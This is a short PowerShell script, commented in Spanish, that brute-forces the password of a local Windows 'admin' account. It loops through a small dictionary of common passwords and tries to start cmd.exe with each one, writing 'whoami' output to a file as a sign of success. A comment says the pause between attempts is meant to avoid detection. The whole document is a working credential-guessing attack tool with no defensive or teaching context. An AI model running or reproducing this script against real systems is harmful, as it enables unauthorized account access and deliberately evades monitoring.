# Diccionario de contraseñas
$passwords = @("password", "hola", "admin", "user", "1234", "qwerty", "letmein")

# Nombre del usuario objetivo
$user = "admin"

foreach ($password in $passwords) {
    try {
        # Mostrar intento actual
        Write-Host "Probando contraseña: $password"

        # Convertir la contraseña en SecureString
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force

        # Crear objeto de credenciales
        $credential = New-Object System.Management.Automation.PSCredential ($user, $securePassword)

        # Intentar ejecutar un comando simple para validar credenciales
        Start-Process -Credential $credential -FilePath "cmd.exe" -ArgumentList "/c whoami > C:\temp\resultado_$password.txt" -NoNewWindow -WorkingDirectory "C:\Windows\System32"

	Start-Sleep -Seconds 2
        # Verificar si el archivo fue creado como indicio de éxito
        if (Test-Path "C:\temp\resultado_$password.txt") {
            Write-Host "Contraseña encontrada: $password"
            break
        }
    } catch {
        # Captura y muestra el error si las credenciales fallan
        # Write-Host "Intento fallido con: $password"
        Write-Host "Error: $($_.Exception.Message)"
    }

    # Pausa entre intentos para evitar detección rápida
    Start-Sleep -Seconds 1
}

